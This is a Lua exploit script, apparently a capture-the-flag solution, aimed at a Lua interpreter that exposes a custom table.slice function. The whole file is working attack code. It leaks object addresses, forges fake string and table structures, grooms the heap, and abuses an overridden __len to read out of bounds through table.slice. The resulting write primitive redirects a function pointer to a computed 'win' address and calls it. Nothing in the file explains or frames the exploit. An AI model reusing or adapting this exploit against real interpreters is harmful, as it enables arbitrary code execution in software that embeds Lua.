victim = {1}


function myaddrof(s)
    tonumber(s:sub(10, 100), 16)
end

function unhexlify(str)
    return str:gsub('..', function(b)
        return string.char(tonumber(b, 16))
    end)
end

function hex(v)
    return string.format("0x%x", v)
end

function addrof(v)
    local strrep = tostring(v)
    local i = string.find(strrep, '0x')
    if i == nil then
        error("Cannot obtain address of given value")
    end
    return tonumber(string.sub(strrep, i+2), 16)
end


function faddrof(s)
    return tonumber(s:sub(13, 100), 16)
end



function p64(x) 
    return string.pack('<L', x)
end


function hax()
    local memview = {1,2,3,4,5}
    local fake_string_data = string.pack('<LbbbbIT', 0,   0x14, 0,     0,    2,     0,    0x7fffffffffffffff)
    local fake_table_data = string.pack('<LbbbbILLLLLL', addrof(memview) + 0x10,   0x05, 8,     0x3f,    0,        0x03,    addrof(memview) + 0x10, addrof(memview) + 0x10,   0,       0,     0,   0x0000000000003e81)
    local fill2 = {}
    for i=1,1000 do
        fill2[i] = {}
    end
    target = {table.remove, table.remove, table.remove}
    local fill = {}
    for i=1, 1000 do
        fill[i]=table.slice(fill2, 0, 1001)
    end
    -- Must be rooted to avoid garbage collection
    data = "ABABABABABABABAB" .. fake_string_data .. "CDCDCDCDCDCDCDCD" .. fake_table_data

    local table_addr = addrof(fill[#fill])
    victim = fill[#fill]
    print("[*] Known table @ " .. hex(table_addr))
    local data_addr = table_addr + 0x3ed8
    local fake_string_addr = data_addr + 0x10
    local fake_table_addr = fake_string_addr + 0x10 + #fake_string_data + 0x10
    local victim_addr = addrof(victim) + 0x40
    trampoline = "ZDZDZDZD" .. p64(fake_table_addr) .. p64(0x45) .. "GUWAWAWAWAWAWAWAWAWAWAWAWAWAWAGUWAWAWAWAWAWAWAWAWAWAWAWAWAWAWW"
    trampoline_addr = table_addr + 0x5038 + 0x8 
    target_addr = addrof(target) + 0x40 

    print("[*] Data @ " .. hex(data_addr))
    print("[*] Fake string @ " .. hex(fake_string_addr))
    print("[*] Fake table @ " .. hex(fake_table_addr))
    print("[*] Victim addr @ " .. hex(victim_addr))
    print("[*] Tranmpoline addr @ " .. hex(trampoline_addr))
    print("[*] Target addr @ " .. hex(target_addr))

    addr = trampoline_addr - victim_addr
    addr = addr + 0x10
    function uouo(o)
        return 10000000
    end
    setmetatable(victim, {__len=uouo})
    print(addr//16, addr//16+1)
    print(#victim)
    tab = table.slice(victim, addr//16, addr//16+1)
    print(tab)
    tab = tab[1]
    print(tab)
--    while true do
--end
    win_addr = faddrof(tostring(table.slice)) - 0x20290
    tab[1] = target_addr
    memview[1] = win_addr

    tab[1] = target_addr + 8
    memview[1] = 0x16

    target[1]()

    -- breakpoint
table.unpack({1,2,3})

end

hax()
